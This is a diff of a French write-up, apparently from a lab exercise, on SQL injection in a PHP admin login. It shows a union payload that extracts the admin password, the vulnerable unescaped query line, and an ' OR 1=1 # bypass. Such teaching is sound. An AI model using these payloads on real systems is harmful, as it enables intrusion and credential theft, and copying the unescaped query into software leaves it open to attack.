@@ -222,3 +222,24 @@ Obtenir le mot de passe de l'administrateur :
 ' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #
 
 ```
+
+# Annnexe 2 - ligne vulnérable (site ==> admin==> index.php ==> ligne 13
+
+
+![image](https://github.com/user-attachments/assets/e0627674-415b-4a37-9d09-4cdbeb575d83)
+
+![image](https://github.com/user-attachments/assets/4d7c5f4b-34d6-4484-bb4e-718f72a855dc)
+
+
+```
+		$rows=$mysqli->query("SELECT * FROM `admin` WHERE `nomutilisateur`='" . $_POST['nomutilisateur'] . "' AND `motdepasse`='" . md5($_POST['motdepasse']) . "' LIMIT 1");//ATTENTION: pas d'échappment des entrées utilisateur (Injection SQL)
+```
+
+```
+		$rows=$mysqli->query("SELECT * FROM `admin` WHERE `nomutilisateur`='
+```
+
+```
+' OR 1=1 #
+```
+
